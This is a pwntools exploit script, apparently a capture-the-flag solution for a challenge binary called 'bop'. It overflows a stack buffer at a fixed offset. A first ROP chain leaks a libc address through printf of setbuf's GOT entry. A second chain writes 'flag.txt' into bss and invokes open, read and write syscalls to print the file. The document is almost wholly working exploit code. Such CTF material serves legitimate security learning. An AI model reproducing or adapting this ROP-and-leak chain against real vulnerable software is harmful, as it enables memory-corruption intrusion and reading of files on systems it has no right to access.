from pwn import *

exe = ELF("bop_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.31.so")

context.binary = exe

r = gdb.debug([exe.path])
# r = remote("mc.ax", 30284)

# Found with GEF's pattern command
offset = 40
main = 0x4012f9

rop1 = ROP(exe, badchars=b'\n')
rop1.raw(rop1.find_gadget(["ret"]))
rop1.printf(exe.got.setbuf)
rop1.raw(rop1.find_gadget(["ret"]))
rop1.raw(main)
log.info(rop1.dump())

r.sendlineafter(b"bop? ", rop1.generatePadding(0, offset) + rop1.chain())

leak = int.from_bytes(r.recvuntil(b"Do", drop=True), "little")
log.info(f"{hex(leak)=}")
libc.address = leak - libc.symbols.setbuf
log.info(f"{hex(libc.address)=}")

# mov [rax], rdi
write_gadget = libc.address + 0x9a0cf

rop2 = ROP([libc, exe], badchars=b'\n')
# Write "flag.txt" to bss
rop2(rax=exe.bss(), rdi=b"flag.txt")
rop2.raw(write_gadget)
# Write a null terminator
rop2(rax=exe.bss() + 8, rdi=0)
rop2.raw(write_gadget)
# Open the flag file
rop2(rax=constants.SYS_open, rdi=exe.bss(), rsi=0)
rop2.raw(rop2.find_gadget(["syscall", "ret"]))
# Read up to 100 bytes from fd 3 to bss
rop2(rax=constants.SYS_read, rdi=3, rsi=exe.bss(), rdx=100)
rop2.raw(rop2.find_gadget(["syscall", "ret"]))
# Write up to 100 bytes from bss to stdout
rop2(rax=constants.SYS_write, rdi=constants.STDOUT_FILENO, rsi=exe.bss(), rdx=100)
rop2.raw(rop2.find_gadget(["syscall"]))
r.sendlineafter(b"bop? ", rop2.generatePadding(0, offset) + rop2.chain())

r.interactive()